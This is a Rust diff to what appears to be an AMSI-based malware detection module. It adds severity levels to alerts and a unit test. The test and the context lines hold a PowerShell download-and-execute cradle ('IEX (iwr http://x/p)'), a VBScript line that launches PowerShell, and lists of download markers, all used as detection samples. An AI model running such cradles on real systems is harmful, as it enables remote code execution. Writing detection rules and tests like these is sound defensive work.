@@ -18,7 +18,7 @@
 
 use std::sync::LazyLock;
 
-use schema::AmsiContentEvent;
+use schema::{AmsiContentEvent, detection::Severity};
 
 use crate::Alert;
 
@@ -45,6 +45,19 @@ const CREDENTIAL_DUMPING: &str = "T1003.001";
 const SCRIPT_HOST_LAUNCH: &str = "T1059.005/T1059.007";
 /// The provider (Defender) itself flagged the content.
 const PROVIDER_DETECTED: &str = "T1059";
+
+/// Each technique above belongs to exactly one rule here, so this is the
+/// per-rule severity #615 asks for. Every rule needs two markers or a
+/// marker with no benign use, hence High; a script host launching an
+/// interpreter is also what some installers and logon scripts do, hence
+/// Medium (the same level as `PowerShell -EncodedCommand`).
+fn severity(technique: &str) -> Severity {
+    if technique == SCRIPT_HOST_LAUNCH {
+        Severity::Medium
+    } else {
+        Severity::High
+    }
+}
 
 /// Network fetch primitives, as AMSI sees them (lowercase).
 const DOWNLOAD_MARKERS: &[&str] = &[
@@ -141,6 +154,7 @@ pub fn evaluate_amsi_content(event: &AmsiContentEvent) -> Vec<Alert> {
     let mut alerts = Vec::new();
     let alert = |technique: &'static str, what: &str| Alert {
         technique,
+        severity: severity(technique),
         message: format!(
             "pid={} comm={}: {what} (AMSI, app={}): {}",
             event.meta.pid,
@@ -430,6 +444,17 @@ CmdletsToExport= "Format-List", "Invoke-Expression", "Invoke-RestMethod", "Invok
             + &"\n# setup step\n".repeat(40)
             + &masked!(b"iex $localCommand");
         assert!(techniques(&ps(&far)).is_empty());
+    }
+
+    #[test]
+    fn severity_follows_the_rule() {
+        let cradle = evaluate_amsi_content(&ps(&masked!(b"IEX (iwr http://x/p)")));
+        assert_eq!(cradle[0].severity, Severity::High);
+        let launch = r#"IWshShell3.Run("powershell -c exit", "0", "true");"#;
+        assert_eq!(
+            evaluate_amsi_content(&amsi("VBScript", launch))[0].severity,
+            Severity::Medium
+        );
     }
 
     #[test]
